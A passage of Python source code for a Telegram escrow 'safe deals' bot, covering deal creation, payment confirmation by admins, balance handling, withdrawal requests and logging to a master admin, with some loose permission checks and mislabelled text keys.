        [premium_button(get_text(lang, "pay_by_balance"), f"pay_balance_{deal_id}", "💰")]
    ])


def back_to_main_button(user_id: int):
    lang = get_user_language(user_id)
    if lang is None:
        lang = "ru"
    return InlineKeyboardMarkup(inline_keyboard=[
        [premium_button(get_text(lang, "main_menu"), "back_to_main", "◀️")]
    ])


# ========== ПОМОЩНИКИ ==========
def is_admin(user_id: int) -> bool:
    return user_id in admins


async def log_to_master(text: str):
    try:
        await bot.send_message(MASTER_ADMIN_ID, text)
    except:
        pass


def get_balance(user_id: int) -> dict:
    uid = str(user_id)
    if uid not in balance:
        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0}
        save_balance(balance)
    return balance[uid]


def add_balance(user_id: int, currency: str, amount: float):
    uid = str(user_id)
    curr = currency.lower()
    if uid not in balance:
        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0}
    balance[uid][curr] = balance[uid].get(curr, 0) + amount
    save_balance(balance)


def get_rekvisits_text(currency, amount):
    curr_key = currency.lower()
    if curr_key in rekvisits:
        return rekvisits[curr_key].format(amount=amount)
    return rekvisits.get("stars", "Реквизиты не заданы").format(amount=amount)


async def safe_edit(callback: types.CallbackQuery, text: str, reply_markup=None, **kwargs):
    try:
        if callback.message.text or callback.message.caption:
            await callback.message.edit_text(text, reply_markup=reply_markup, **kwargs)
        else:
            await callback.message.answer(text, reply_markup=reply_markup, **kwargs)
    except Exception as e:
        print(f"Ошибка при редактировании: {e}")
        try:
            await callback.message.answer(text, reply_markup=reply_markup, **kwargs)
        except:
            pass


async def send_welcome_message(message: types.Message, user_id: int):
    lang = get_user_language(user_id)
    if lang is None:
        lang = "ru"
    
    welcome_text = f"""{pm('🔥')} {get_text(lang, 'bot_name')} {pm('🔥')}

{pm('🏴‍☠️')} {get_text(lang, 'safe_deals')}
• {pm('🤝')} {get_text(lang, 'feature1')}
• {pm('💎')} {get_text(lang, 'feature2')}
• {pm('🔒')} {get_text(lang, 'feature3')}
• {pm('👑')} {get_text(lang, 'feature4')}

{pm('📊')} {get_text(lang, 'how_it_works')}:
{pm('1️⃣')} {get_text(lang, 'step1')}
{pm('2️⃣')} {get_text(lang, 'step2')}
{pm('3️⃣')} {get_text(lang, 'step3')}
{pm('4️⃣')} {get_text(lang, 'step4')}
{pm('5️⃣')} {get_text(lang, 'step5')}
{pm('6️⃣')} {get_text(lang, 'step6')}
{pm('7️⃣')} {get_text(lang, 'step7')}

{pm('📢')} {get_text(lang, 'our_channel')}: {CHANNEL_LINK}
{pm('🆘')} {get_text(lang, 'support')}: @p2psuptokeeperbot

{pm('🔥')} {get_text(lang, 'start_now')} {pm('🚀')}"""

    if start_photo.get("file_id"):
        try:
            await message.answer_photo(
                photo=start_photo["file_id"],
                caption=welcome_text,
                reply_markup=main_menu_keyboard(user_id)
            )
            return
        except:
            pass

    await message.answer(welcome_text, reply_markup=main_menu_keyboard(user_id))


async def send_language_selection(message: types.Message):
    text = f"{pm('🌐')} {get_text('ru', 'choose_language_prompt')}"
    await message.answer(text, reply_markup=language_keyboard())


async def send_buyer_pending_message(deal_id: str):
    deal = deals[deal_id]
    buyer_lang = get_user_language(deal.get("buyer_id", 0))
    if buyer_lang is None:
        buyer_lang = "ru"
    keyboard = buyer_pending_keyboard(deal_id)

    try:
        msg = await bot.send_message(
            deal["buyer_username"],
            f"{pm('✈️')} {get_text(buyer_lang, 'paid')} #{deal_id}!\n\n"
            f"{pm('📦')} {get_text(buyer_lang, 'feature1')}: {deal['product']}\n"
            f"{pm('💰')} {get_text(buyer_lang, 'enter_amount')}: {deal['amount']} {deal['currency']}\n"
            f"{pm('👤')} {get_text(buyer_lang, 'our_channel')}: @{deal['seller_username']}\n\n"
            f"{pm('⏳')} {get_text(buyer_lang, 'awaiting_confirmation')}\n\n"
            f"{pm('🔥')} {get_text(buyer_lang, 'premium_1')}",
            reply_markup=keyboard
        )
        deal["buyer_message_id"] = msg.message_id
        deal["buyer_chat_id"] = msg.chat.id
        save_deals(deals)
    except Exception as e:
        print(f"Ошибка: {e}")


# ========== ВЫБОР ЯЗЫКА ==========
@dp.callback_query(lambda c: c.data == "select_language")
async def select_language_callback(callback: types.CallbackQuery):
    text = f"{pm('🌐')} {get_text('ru', 'choose_language_prompt')}"
    await safe_edit(callback, text, reply_markup=language_keyboard())


@dp.callback_query(lambda c: c.data.startswith("set_lang_"))
async def set_language_callback(callback: types.CallbackQuery):
    lang_code = callback.data.split("_")[2]
    set_user_language(callback.from_user.id, lang_code)
    await callback.answer(f"Language set to {LANGUAGES[lang_code]}")
    await send_welcome_message(callback.message, callback.from_user.id)


# ========== ОБРАБОТЧИКИ ГЛАВНОГО МЕНЮ ==========
@dp.callback_query(lambda c: c.data == "back_to_main")
async def back_to_main(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    if lang is None:
        lang = "ru"
    text = f"{pm('🔥')} {get_text(lang, 'bot_name')} — {get_text(lang, 'safe_deals')} {pm('🔥')}\n\n{get_text(lang, 'choose_action')}:"
    await safe_edit(callback, text, reply_markup=main_menu_keyboard(callback.from_user.id))


@dp.callback_query(lambda c: c.data == "menu_create_deal")
async def menu_create_deal(callback: types.CallbackQuery, state: FSMContext):
    lang = get_user_language(callback.from_user.id)
    if lang is None:
        lang = "ru"
    text = f"{pm('✏️')} {get_text(lang, 'describe_product')}:\n\n{get_text(lang, 'example_product')}"
    await safe_edit(callback, text)
    await state.set_state(DealStates.waiting_for_product)


@dp.callback_query(lambda c: c.data == "menu_my_balance")
async def menu_my_balance(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    if lang is None:
        lang = "ru"
    user_balance = get_balance(callback.from_user.id)
    text = f"""{pm('💰')} {get_text(lang, 'your_balance')} {pm('💰')}

{pm('💎')} TON: {user_balance['ton']}
{pm('⭐️')} STARS: {user_balance['stars']}
{pm('💰')} RUB: {user_balance['rub']}
{pm('🌐')} UAH: {user_balance['uah']}

{pm('⬇️')} {get_text(lang, 'withdraw_funds')} {pm('⬇️')}"""

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [premium_button(get_text(lang, "withdraw_funds"), "start_withdraw", "💲")],
        [premium_button(get_text(lang, "main_menu"), "back_to_main", "◀️")]
    ])
    await safe_edit(callback, text, reply_markup=keyboard)


@dp.callback_query(lambda c: c.data == "menu_my_deals")
async def menu_my_deals(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    if lang is None:
        lang = "ru"
    user_deals = []
    for d_id, d in deals.items():
        if d.get("seller_id") == callback.from_user.id:
            user_deals.append((d_id, d))

    if not user_deals:
        text = f"{pm('📭')} {get_text(lang, 'no_deals')}"
        await safe_edit(callback, text, reply_markup=back_to_main_button(callback.from_user.id))
    else:
        text = f"{pm('📊')} {get_text(lang, 'your_deals')}\n\n"
        for d_id, d in user_deals[-10:]:
            status_emoji = {
                "waiting_payment": pm('⏳'),
                "paid": pm('✅'),
                "awaiting_confirmation": pm('📦'),
                "completed": pm('🎁')
            }.get(d['status'], pm('❓'))
            text += f"{d_id} | {status_emoji} | {d['amount']} {d['currency']}\n   → {d['product'][:30]}\n\n"
        await safe_edit(callback, text, reply_markup=back_to_main_button(callback.from_user.id))


@dp.callback_query(lambda c: c.data == "menu_premium")
async def menu_premium(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    if lang is None:
        lang = "ru"
    text = f"""{pm('🔥')} {get_text(lang, 'premium_status')} {pm('🔥')}

{pm('💎')} {get_text(lang, 'premium_privileges')}:
• {pm('✅')} {get_text(lang, 'premium_1')}
• {pm('📉')} {get_text(lang, 'premium_2')}
• {pm('🚀')} {get_text(lang, 'premium_3')}
• {pm('🎁')} {get_text(lang, 'premium_4')}

{pm('⭐️')} {get_text(lang, 'premium_active')}

{pm('🚀')} THANK YOU FOR BEING WITH US!"""
    await safe_edit(callback, text, reply_markup=back_to_main_button(callback.from_user.id))


@dp.callback_query(lambda c: c.data == "menu_faq")
async def menu_faq(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    if lang is None:
        lang = "ru"
    text = f"""{pm('❓')} {get_text(lang, 'faq')}

{pm('1️⃣')} {get_text(lang, 'faq_q1')}
{get_text(lang, 'faq_a1')}

{pm('2️⃣')} {get_text(lang, 'faq_q2')}
{get_text(lang, 'faq_a2')}

{pm('3️⃣')} {get_text(lang, 'faq_q3')}
{get_text(lang, 'faq_a3')}

{pm('4️⃣')} {get_text(lang, 'faq_q4')}
{get_text(lang, 'faq_a4')}

{pm('5️⃣')} {get_text(lang, 'faq_q5')}
{get_text(lang, 'faq_a5')}

{pm('6️⃣')} {get_text(lang, 'faq_q6')}
{get_text(lang, 'faq_a6')}

{pm('7️⃣')} {get_text(lang, 'faq_q7')}
{get_text(lang, 'faq_a7')}"""
    await safe_edit(callback, text, reply_markup=back_to_main_button(callback.from_user.id))


@dp.callback_query(lambda c: c.data == "menu_channel")
async def menu_channel(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    if lang is None:
        lang = "ru"
    text = f"""{pm('📢')} {get_text(lang, 'our_channel')}

🔥 Subscribe to stay updated:
{CHANNEL_LINK}

{pm('💎')} In the channel:
• News and updates
• Useful guides
• Giveaways and bonuses
• Current exchange rates

{pm('🚀')} CLICK THE LINK AND SUBSCRIBE!"""
    await safe_edit(callback, text, reply_markup=back_to_main_button(callback.from_user.id), disable_web_page_preview=False)


@dp.callback_query(lambda c: c.data == "menu_admin_panel")
async def menu_admin_panel(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer(f"{pm('❌')} {get_text('ru', 'access_denied')}", show_alert=True)
        return
    lang = get_user_language(callback.from_user.id)
    if lang is None:
        lang = "ru"
    text = f"{pm('👑')} {get_text(lang, 'admin_panel')}\n\n{get_text(lang, 'choose_action')}:"
    await safe_edit(callback, text, reply_markup=admin_panel_keyboard(callback.from_user.id))


# ========== СТАРТ ==========
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    # Проверяем, есть ли у пользователя выбранный язык
    if not has_language(message.from_user.id):
        # Если язык не выбран - показываем выбор языка
        await send_language_selection(message)
        return
    
    # Обработка сделки по ссылке
    if message.text and message.text.startswith("/start deal_"):
        deal_id = message.text.split("_")[1]
        if deal_id not in deals:
            lang = get_user_language(message.from_user.id) or "ru"
            await message.answer(f"{pm('❌')} {get_text(lang, 'deal_not_found')}")
            return

        deal = deals[deal_id]
        deal["buyer_id"] = message.from_user.id
        save_deals(deals)

        if message.from_user.username != deal["buyer_username"]:
            lang = get_user_language(message.from_user.id) or "ru"
            await message.answer(
                f"{pm('❌')} {get_text(lang, 'access_denied')}!\n\nThis deal is for @{deal['buyer_username']}\n\nContact support: @dealtonkeeper_bot"
            )
            await log_to_master(
                f"⚠️ UNAUTHORIZED ACCESS\nDeal: #{deal_id}\nAttempted by: @{message.from_user.username}\nExpected: @{deal['buyer_username']}")
            return

        if deal["status"] != "waiting_payment":
            lang = get_user_language(message.from_user.id) or "ru"
            await message.answer(f"{pm('❌')} Deal already in status: {deal['status']}")
            return

        buyer_lang = get_user_language(message.from_user.id) or "ru"
        await message.answer(
            f"{pm('✈️')} DEAL #{deal_id}\n\n"
            f"{pm('📦')} {get_text(buyer_lang, 'feature1')}: {deal['product']}\n"
            f"{pm('💰')} {get_text(buyer_lang, 'enter_amount')}: {deal['amount']} {deal['currency']}\n"
            f"{pm('👤')} {get_text(buyer_lang, 'our_channel')}: @{deal['seller_username']}\n\n"
            f"{pm('⬇️')} {get_text(buyer_lang, 'choose_payment_method')} {pm('⬇️')}",
            reply_markup=payment_method_keyboard(deal_id, message.from_user.id)
        )

        await log_to_master(
            f"👁 BUYER ENTERED DEAL\n"
            f"Deal: #{deal_id}\n"
            f"Buyer: {message.from_user.full_name} (@{message.from_user.username})"
        )
        return

    # Если язык выбран - показываем приветственное меню
    await send_welcome_message(message, message.from_user.id)


# ========== ВЫВОД ==========
@dp.callback_query(lambda c: c.data == "start_withdraw")
async def start_withdraw(callback: types.CallbackQuery, state: FSMContext):
    lang = get_user_language(callback.from_user.id)
    if lang is None:
        lang = "ru"
    user_balance = get_balance(callback.from_user.id)
    has_money = any(v > 0 for v in user_balance.values())

    if not has_money:
        await callback.answer(f"{pm('❌')} {get_text(lang, 'insufficient_balance')}", show_alert=True)
        return

    text = f"{pm('💰')} {get_text(lang, 'choose_currency')}:"
    await safe_edit(callback, text, reply_markup=withdraw_currency_keyboard(callback.from_user.id))
    await state.set_state(WithdrawStates.waiting_for_currency)


@dp.callback_query(lambda c: c.data.startswith("withdraw_"))
async def withdraw_currency(callback: types.CallbackQuery, state: FSMContext):
    lang = get_user_language(callback.from_user.id)
    if lang is None:
        lang = "ru"
    currency = callback.data.split("_")[1]
    user_balance = get_balance(callback.from_user.id)
    curr_key = currency.lower()

    if user_balance.get(curr_key, 0) <= 0:
        await callback.answer(f"{pm('❌')} No funds in {currency}", show_alert=True)
        return

    await state.update_data(withdraw_currency=currency, withdraw_amount=user_balance[curr_key])

    if currency == "STARS":
        text = f"{pm('⭐️')} Enter your Telegram username to receive Stars:\n\nEXAMPLE: @john_doe"
    else:
        text = f"{pm('💲')} Enter details for {currency} withdrawal:\n\nEXAMPLE for TON: UQ...\nEXAMPLE for RUB/UAH: Card number or wallet"

    await safe_edit(callback, text)
    await state.set_state(WithdrawStates.waiting_for_details)


@dp.message(WithdrawStates.waiting_for_details)
async def withdraw_details(message: types.Message, state: FSMContext):
    lang = get_user_language(message.from_user.id)
    if lang is None:
        lang = "ru"
    data = await state.get_data()
    currency = data["withdraw_currency"]
    amount = data["withdraw_amount"]
    details = message.text.strip()

    request_id = str(uuid.uuid4())[:8]
    withdraw_requests[request_id] = {
        "user_id": message.from_user.id,
        "username": message.from_user.username,
        "full_name": message.from_user.full_name,
        "currency": currency,
        "amount": amount,
        "details": details,
        "status": "pending",
        "created_at": datetime.now().isoformat()
    }
    save_withdraw_requests(withdraw_requests)

    await bot.send_message(
        MASTER_ADMIN_ID,
        f"{pm('💲')} NEW WITHDRAWAL REQUEST #{request_id}\n\n"
        f"👤 User: {message.from_user.full_name} (@{message.from_user.username})\n"
        f"{pm('💰')} Amount: {amount} {currency}\n"
        f"{pm('📝')} Details: {details}\n\n"
        f"TO CONFIRM: /confirm_withdraw {request_id}"
    )

    await message.answer(
        f"{pm('✅')} WITHDRAWAL REQUEST #{request_id} CREATED!\n\n"
        f"{pm('💰')} Amount: {amount} {currency}\n"
        f"{pm('⏳')} Please wait 1-5 minutes for processing.\n\n"
        f"Check status: /withdraw_status {request_id}",
        reply_markup=back_to_main_button(message.from_user.id)
    )

    await log_to_master(f"💸 New withdrawal request: #{request_id} from @{message.from_user.username}")
    await state.clear()


@dp.message(Command("confirm_withdraw"))
async def confirm_withdraw(message: types.Message):
    if not is_admin(message.from_user.id):
        await message.answer(f"{pm('❌')} INSUFFICIENT RIGHTS")
        return

    args = message.text.split()
    if len(args) != 2:
        await message.answer(f"{pm('❗️')} USAGE: /confirm_withdraw [REQUEST ID]")
        return

    request_id = args[1]
    if request_id not in withdraw_requests:
        await message.answer(f"{pm('❌')} REQUEST {request_id} NOT FOUND")
        return

    req = withdraw_requests[request_id]
    if req["status"] != "pending":
        await message.answer(f"{pm('❌')} REQUEST ALREADY PROCESSED: {req['status']}")
        return

    req["status"] = "completed"
    req["completed_at"] = datetime.now().isoformat()
    req["completed_by"] = message.from_user.id
    save_withdraw_requests(withdraw_requests)

    user_balance = get_balance(req["user_id"])
    curr_key = req["currency"].lower()
    if user_balance.get(curr_key, 0) >= req["amount"]:
        user_balance[curr_key] -= req["amount"]
        save_balance(balance)

    try:
        await bot.send_message(
            req["user_id"],
            f"{pm('✅')} WITHDRAWAL CONFIRMED!\n\n"
            f"{pm('💰')} Amount: {req['amount']} {req['currency']}\n"
            f"{pm('📝')} Details: {req['details']}\n\n"
            f"Funds will be sent within 1-5 minutes."
        )
    except:
        pass

    await message.answer(f"{pm('✅')} WITHDRAWAL #{request_id} CONFIRMED! FUNDS DEDUCTED.")
    await log_to_master(f"✅ Withdrawal #{request_id} confirmed by admin @{message.from_user.username}")


@dp.message(Command("withdraw_status"))
async def withdraw_status(message: types.Message):
    args = message.text.split()
    if len(args) != 2:
        await message.answer(f"{pm('❗️')} USAGE: /withdraw_status [REQUEST ID]")
        return

    request_id = args[1]
    if request_id not in withdraw_requests:
        await message.answer(f"{pm('❌')} REQUEST {request_id} NOT FOUND")
        return

    req = withdraw_requests[request_id]
    status_text = {
        "pending": f"{pm('⏳')} PENDING",
        "completed": f"{pm('✅')} COMPLETED"
    }.get(req["status"], req["status"])

    await message.answer(
        f"{pm('📊')} WITHDRAWAL STATUS #{request_id}\n\n"
        f"{pm('💰')} Amount: {req['amount']} {req['currency']}\n"
        f"📅 Created: {req['created_at'][:19]}\n"
        f"📊 Status: {status_text}"
    )


# ========== СОЗДАНИЕ СДЕЛКИ ==========
@dp.message(DealStates.waiting_for_product)
async def get_product(message: types.Message, state: FSMContext):
    lang = get_user_language(message.from_user.id)
    if lang is None:
        lang = "ru"
    await state.update_data(product=message.text.strip())
    await message.answer(f"{pm('💱')} {get_text(lang, 'choose_currency')}:", reply_markup=currency_keyboard(message.from_user.id))
    await state.set_state(DealStates.waiting_for_currency)


@dp.callback_query(lambda c: c.data.startswith("curr_"))
async def get_currency(callback: types.CallbackQuery, state: FSMContext):
    lang = get_user_language(callback.from_user.id)
    if lang is None:
        lang = "ru"
    currency = callback.data.split("_")[1]
    await state.update_data(currency=currency)
    text = f"{pm('💰')} {get_text(lang, 'enter_amount')}:\nCURRENCY: {currency}"
    await safe_edit(callback, text)
    await state.set_state(DealStates.waiting_for_amount)


@dp.message(DealStates.waiting_for_amount)
async def get_amount(message: types.Message, state: FSMContext):
    lang = get_user_language(message.from_user.id)
    if lang is None:
        lang = "ru"
    try:
        amount = float(message.text.strip())
        if amount <= 0:
            raise ValueError
        await state.update_data(amount=amount)
        await message.answer(
            f"{pm('👤')} {get_text(lang, 'enter_buyer')}:\n\n{get_text(lang, 'buyer_username_example')}\n\n{pm('❗️')} {get_text(lang, 'only_this_user')}")
        await state.set_state(DealStates.waiting_for_buyer_username)
    except:
        await message.answer(f"{pm('❌')} {get_text(lang, 'invalid_amount')}")


@dp.message(DealStates.waiting_for_buyer_username)
async def get_buyer(message: types.Message, state: FSMContext):
    lang = get_user_language(message.from_user.id)
    if lang is None:
        lang = "ru"
    buyer_username = message.text.strip().replace("@", "").lower()
    data = await state.get_data()

    deal_id = str(uuid.uuid4())[:8]
    deals[deal_id] = {
        "deal_id": deal_id,
        "seller_id": message.from_user.id,
        "seller_username": message.from_user.username,
        "buyer_username": buyer_username,
        "buyer_id": None,
        "product": data["product"],
        "currency": data["currency"],
        "amount": data["amount"],
        "status": "waiting_payment",
        "created_at": datetime.now().isoformat(),
        "paid_by_admin": None,
        "completed_at": None,
        "buyer_message_id": None,
        "buyer_chat_id": None
    }
    save_deals(deals)

    deal_link = f"https://t.me/{BOT_USERNAME}?start=deal_{deal_id}"

    await message.answer(
        f"{pm('✅')} {get_text(lang, 'deal_created')} #{deal_id}!\n\n"
        f"{pm('💰')} {get_text(lang, 'enter_amount')}: {data['amount']} {data['currency']}\n"
        f"{pm('📦')} {get_text(lang, 'feature1')}: {data['product']}\n"
        f"{pm('👤')} {get_text(lang, 'our_channel')}: @{buyer_username}\n\n"
        f"{pm('🔗')} {get_text(lang, 'send_link_to_buyer')}:\n\n"
        f"{deal_link}\n\n"
        f"{pm('🔥')} {get_text(lang, 'premium_1')}",
        reply_markup=back_to_main_button(message.from_user.id)
    )

    await log_to_master(
        f"🆕 DEAL CREATED\n"
        f"ID: #{deal_id}\n"
        f"Seller: {message.from_user.full_name} (@{message.from_user.username})\n"
        f"Buyer: @{buyer_username}\n"
        f"Amount: {data['amount']} {data['currency']}\n"
        f"Product: {data['product']}"
    )
    await state.clear()


# ========== ОПЛАТА ==========
@dp.callback_query(lambda c: c.data.startswith("pay_rekvisits_"))
async def pay_by_rekvisits(callback: types.CallbackQuery):
    deal_id = callback.data.split("_")[2]
    if deal_id not in deals:
        await callback.answer(f"{pm('❌')} DEAL NOT FOUND")
        return

    deal = deals[deal_id]
    if deal["status"] != "waiting_payment":
        await callback.answer(f"{pm('❌')} DEAL ALREADY IN STATUS {deal['status']}")
        return

    pay_text = get_rekvisits_text(deal["currency"], deal["amount"])
    lang = get_user_language(callback.from_user.id)
    if lang is None:
        lang = "ru"

    text = f"{pm('✈️')} DEAL #{deal_id}\n\n" \
           f"{pm('📦')} {get_text(lang, 'feature1')}: {deal['product']}\n" \
           f"{pm('💰')} {get_text(lang, 'enter_amount')}: {deal['amount']} {deal['currency']}\n" \
           f"{pm('👤')} {get_text(lang, 'our_channel')}: @{deal['seller_username']}\n\n" \
           f"{pm('💳')} PAYMENT DETAILS:\n{pay_text}\n\n" \
           f"{pm('🔥')} AFTER PAYMENT, ADMIN WILL VERIFY WITH /pay {deal_id} {pm('🔥')}"
    await safe_edit(callback, text)


@dp.callback_query(lambda c: c.data.startswith("pay_balance_"))
async def pay_by_balance(callback: types.CallbackQuery):
    deal_id = callback.data.split("_")[2]
    if deal_id not in deals:
        await callback.answer(f"{pm('❌')} DEAL NOT FOUND")
        return

    deal = deals[deal_id]
    if deal["status"] != "waiting_payment":
        await callback.answer(f"{pm('❌')} DEAL ALREADY IN STATUS {deal['status']}")
        return

    buyer_balance = get_balance(callback.from_user.id)
    curr_key = deal["currency"].lower()
    lang = get_user_language(callback.from_user.id)
    if lang is None:
        lang = "ru"

    if buyer_balance.get(curr_key, 0) < deal["amount"]:
        await callback.answer(
            f"{pm('❌')} {get_text(lang, 'insufficient_balance')}!\nNEEDED: {deal['amount']} {deal['currency']}\nAVAILABLE: {buyer_balance.get(curr_key, 0)}",
            show_alert=True)
        return

    buyer_balance[curr_key] -= deal["amount"]
    save_balance(balance)

    deal["status"] = "paid"
    deal["paid_by_admin"] = callback.from_user.id
    save_deals(deals)

    text = f"{pm('✅')} {get_text(lang, 'payment_confirmed')}!\n\n" \
           f"DEAL #{deal_id}\n" \
           f"{pm('💰')} DEDUCTED FROM BALANCE: {deal['amount']} {deal['currency']}\n\n" \
           f"{pm('🔔')} {get_text(lang, 'premium_1')}"
    await safe_edit(callback, text, reply_markup=back_to_main_button(callback.from_user.id))

    await send_buyer_pending_message(deal_id)

    seller_lang = get_user_language(deal["seller_id"])
    if seller_lang is None:
        seller_lang = "ru"
    await bot.send_message(
        deal["seller_id"],
        f"{pm('💎')} DEAL #{deal_id} {get_text(seller_lang, 'paid')}! {pm('💎')}\n\n"
        f"{pm('💰')} {get_text(seller_lang, 'enter_amount')}: {deal['amount']} {deal['currency']}\n"
        f"{pm('📦')} {get_text(seller_lang, 'feature1')}: {deal['product']}\n"
        f"{pm('👤')} {get_text(seller_lang, 'our_channel')}: @{deal['buyer_username']}\n\n"
        f"{pm('⬇️')} {get_text(seller_lang, 'step5')} {pm('⬇️')}",
        reply_markup=seller_confirm_keyboard(deal_id)
    )

    await log_to_master(f"💰 Deal #{deal_id} paid from balance by @{callback.from_user.username}")


@dp.message(Command("pay"))
async def pay_command(message: types.Message):
    if not is_admin(message.from_user.id):
        await message.answer(f"{pm('❌')} INSUFFICIENT RIGHTS")
        return

    args = message.text.split()
    if len(args) != 2:
        await message.answer(f"{pm('❗️')} USAGE: /pay [DEAL ID]\nEXAMPLE: /pay a3f2b1c4")
        return

    deal_id = args[1]
    if deal_id not in deals:
        await message.answer(f"{pm('❌')} DEAL WITH ID {deal_id} NOT FOUND")
        return

    deal = deals[deal_id]
    if deal["status"] != "waiting_payment":
        await message.answer(f"{pm('❌')} DEAL ALREADY IN STATUS {deal['status']}")
        return

    deal["status"] = "paid"
    deal["paid_by_admin"] = message.from_user.id
    save_deals(deals)

    await message.answer(f"{pm('✅')} PAYMENT CONFIRMED FOR DEAL {deal_id}")

    await send_buyer_pending_message(deal_id)

    seller_lang = get_user_language(deal["seller_id"])
    if seller_lang is None:
        seller_lang = "ru"
    await bot.send_message(
        deal["seller_id"],
        f"{pm('💎')} DEAL #{deal_id} {get_text(seller_lang, 'paid')}! {pm('💎')}\n\n"
        f"{pm('💰')} {get_text(seller_lang, 'enter_amount')}: {deal['amount']} {deal['currency']}\n"
        f"{pm('📦')} {get_text(seller_lang, 'feature1')}: {deal['product']}\n"
        f"{pm('👤')} {get_text(seller_lang, 'our_channel')}: @{deal['buyer_username']}\n\n"
        f"{pm('⬇️')} {get_text(seller_lang, 'step5')} {pm('⬇️')}",
        reply_markup=seller_confirm_keyboard(deal_id)
    )

    await log_to_master(
        f"💸 PAYMENT CONFIRMED\n"
        f"Deal: #{deal_id}\n"
        f"Admin: {message.from_user.full_name} (@{message.from_user.username})\n"
        f"Seller: @{deal['seller_username']}\n"
        f"Amount: {deal['amount']} {deal['currency']}"
    )


@dp.callback_query(lambda c: c.data.startswith("seller_done_"))
async def seller_delivered(callback: types.CallbackQuery):
    deal_id = callback.data.split("_")[-1]
    if deal_id not in deals:
        await callback.answer(f"{pm('❌')} DEAL NOT FOUND")
        return

    deal = deals[deal_id]
    if deal["status"] != "paid":
        await callback.answer(f"{pm('❌')} PAYMENT NOT CONFIRMED YET")
        return

    deal["status"] = "awaiting_confirmation"
    save_deals(deals)

    seller_lang = get_user_language(callback.from_user.id)
    if seller_lang is None:
        seller_lang = "ru"
    text = f"{pm('✅')} {get_text(seller_lang, 'seller_confirmed')}!\n\n" \
           f"{pm('📦')} {get_text(seller_lang, 'feature1')}: {deal['product']}\n" \
           f"{pm('💰')} {get_text(seller_lang, 'enter_amount')}: {deal['amount']} {deal['currency']}\n" \
           f"{pm('👤')} {get_text(seller_lang, 'our_channel')}: @{deal['buyer_username']}\n\n" \
           f"{pm('⏳')} {get_text(seller_lang, 'awaiting_confirmation')}..."
    await safe_edit(callback, text)

    active_keyboard = buyer_confirm_keyboard(deal_id)
    updated = False

    if deal.get("buyer_message_id") and deal.get("buyer_chat_id"):
        try:
            await bot.edit_message_reply_markup(
                chat_id=deal["buyer_chat_id"],
                message_id=deal["buyer_message_id"],
                reply_markup=active_keyboard
            )
            updated = True
        except Exception as e:
            print(f"Failed to update keyboard: {e}")

    if not updated:
        try:
            await bot.send_message(
                deal["buyer_username"],
                f"{pm('📦')} SELLER DELIVERED PRODUCT FOR DEAL #{deal_id}!\n\n"
                f"{pm('📦')} Product: {deal['product']}\n"
                f"{pm('💰')} Amount: {deal['amount']} {deal['currency']}\n"
                f"{pm('👤')} Seller: @{deal['seller_username']}\n\n"
                f"{pm('👍')} CONFIRM RECEIPT:",
                reply_markup=active_keyboard
            )
        except:
            if deal.get("buyer_id"):
                try:
                    await bot.send_message(
                        deal["buyer_id"],
                        f"{pm('📦')} SELLER DELIVERED PRODUCT FOR DEAL #{deal_id}!\n\n"
                        f"{pm('📦')} Product: {deal['product']}\n"
                        f"{pm('💰')} Amount: {deal['amount']} {deal['currency']}\n"
                        f"{pm('👤')} Seller: @{deal['seller_username']}\n\n"
                        f"{pm('👍')} CONFIRM RECEIPT:",
                        reply_markup=active_keyboard
                    )
                except Exception as e:
                    await callback.message.answer(
                        f"{pm('❗️')} COULD NOT NOTIFY BUYER @{deal['buyer_username']}\n\n"
                        f"Send them this link:\nhttps://t.me/{BOT_USERNAME}?start=deal_{deal_id}"
                    )

    await callback.answer(f"{pm('✅')} Seller confirmed product delivery")


@dp.callback_query(lambda c: c.data.startswith("buyer_confirm_"))
async def buyer_confirm_receipt(callback: types.CallbackQuery):
    deal_id = callback.data.split("_")[2]
    if deal_id not in deals:
        await callback.answer(f"{pm('❌')} DEAL NOT FOUND")
        return

    deal = deals[deal_id]
    if deal["status"] != "awaiting_confirmation":
        await callback.answer(f"{pm('❌')} SELLER HAS NOT CONFIRMED DELIVERY YET")
        return

    add_balance(deal["seller_id"], deal["currency"], deal["amount"])

    deal["status"] = "completed"
    deal["completed_at"] = datetime.now().isoformat()
    save_deals(deals)

    buyer_lang = get_user_language(callback.from_user.id)
    if buyer_lang is None:
        buyer_lang = "ru"
    text = f"{pm('✅')} {get_text(buyer_lang, 'buyer_confirmed')}!\n\n" \
           f"DEAL #{deal_id} {get_text(buyer_lang, 'completed')}.\n" \
           f"{pm('🤝')} THANK YOU FOR YOUR TRUST!"
    await safe_edit(callback, text, reply_markup=back_to_main_button(callback.from_user.id))

    seller_lang = get_user_language(deal["seller_id"])
    if seller_lang is None:
        seller_lang = "ru"
    await bot.send_message(
        deal["seller_id"],
        f"{pm('🎁')} DEAL #{deal_id} {get_text(seller_lang, 'completed')}! {pm('🎁')}\n\n"
        f"{pm('💰')} {deal['amount']} {deal['currency']} ADDED TO YOUR BALANCE.\n"
        f"{pm('📦')} Product: {deal['product']}\n"
        f"{pm('👤')} Buyer: @{deal['buyer_username']}\n\n"
        f"{pm('📊')} CHECK BALANCE IN MAIN MENU."
    )

    await log_to_master(
        f"🎉 DEAL COMPLETED\n"
        f"ID: #{deal_id}\n"
        f"Seller: @{deal['seller_username']} (+{deal['amount']} {deal['currency']})\n"
        f"Buyer: @{deal['buyer_username']}"
    )


# ========== АДМИН-ПАНЕЛЬ ==========
@dp.callback_query(lambda c: c.data == "withdraw_requests")
async def show_withdraw_requests(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer(f"{pm('❌')} ACCESS DENIED", show_alert=True)
        return

    pending = {rid: req for rid, req in withdraw_requests.items() if req["status"] == "pending"}

    if not pending:
        text = f"{pm('📭')} NO ACTIVE WITHDRAWAL REQUESTS"
        await safe_edit(callback, text, reply_markup=back_to_main_button(callback.from_user.id))
    else:
        text = f"{pm('💲')} WITHDRAWAL REQUESTS\n\n"
        for rid, req in pending.items():
